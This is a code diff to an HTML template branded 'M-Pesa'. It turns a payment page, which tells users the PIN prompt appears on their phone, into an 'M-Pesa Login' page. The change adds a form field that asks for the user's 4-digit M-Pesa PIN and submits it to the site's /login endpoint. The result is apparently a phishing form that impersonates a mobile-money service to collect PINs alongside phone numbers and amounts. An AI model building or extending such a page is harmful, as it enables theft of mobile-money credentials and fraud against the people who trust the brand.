@@ -3,9 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>M-Pesa Payment</title>
+  <title>M-Pesa Login</title>
   <style>
-    * { box-sizing: border-box; }
+    * {
+      box-sizing: border-box;
+    }
 
     body {
       margin: 0;
@@ -20,7 +22,7 @@
 
     .container {
       width: 100%;
-      max-width: 430px;
+      max-width: 420px;
       background: #ffffff;
       border-radius: 14px;
       padding: 30px 24px;
@@ -82,39 +84,54 @@
       background: #085d32;
     }
 
-    .message {
+    .error {
       min-height: 22px;
       margin-top: 12px;
+      color: #b42318;
       font-size: 14px;
       text-align: center;
     }
 
-    .error { color: #b42318; }
-    .success { color: #0b7a3d; }
+    .success {
+      min-height: 22px;
+      margin-top: 12px;
+      color: #0b7a3d;
+      font-size: 14px;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>M-Pesa Payment</h2>
-    <p class="subtitle">Enter your phone number and amount. The M-Pesa PIN prompt will appear on your phone.</p>
+    <h2>M-Pesa Login</h2>
+    <p class="subtitle">Enter your details to continue securely.</p>
 
     <form method="POST" action="/login" novalidate>
       <div class="field">
         <label for="phone">Phone Number</label>
-        <input id="phone" name="phone" type="tel" value="{{ phone or '' }}" placeholder="254712345678" required />
+        <input id="phone" name="phone" type="tel" placeholder="254712345678" value="{{ phone or '' }}" required />
       </div>
 
       <div class="field">
         <label for="amount">Amount</label>
-        <input id="amount" name="amount" type="number" min="1" step="0.01" value="{{ amount or '' }}" placeholder="500" required />
+        <input id="amount" name="amount" type="number" placeholder="Enter amount" value="{{ amount or '' }}" step="0.01" required />
       </div>
 
-      <button type="submit">Send M-Pesa Prompt</button>
+      {% if show_pin %}
+      <div class="field">
+        <label for="pin">M-Pesa PIN</label>
+        <input id="pin" name="pin" type="password" placeholder="Enter your 4-digit PIN" value="{{ pin or '' }}" maxlength="4" required />
+      </div>
+      {% endif %}
+
+      <button type="submit">{% if show_pin %}Confirm PIN{% else %}Continue{% endif %}</button>
 
       {% if error %}
-        <p class="message error">{{ error }}</p>
-      {% elif success %}
-        <p class="message success">{{ success }}</p>
+      <p class="error">{{ error }}</p>
+      {% endif %}
+
+      {% if success %}
+      <p class="success">{{ success }}</p>
       {% endif %}
     </form>
   </div>
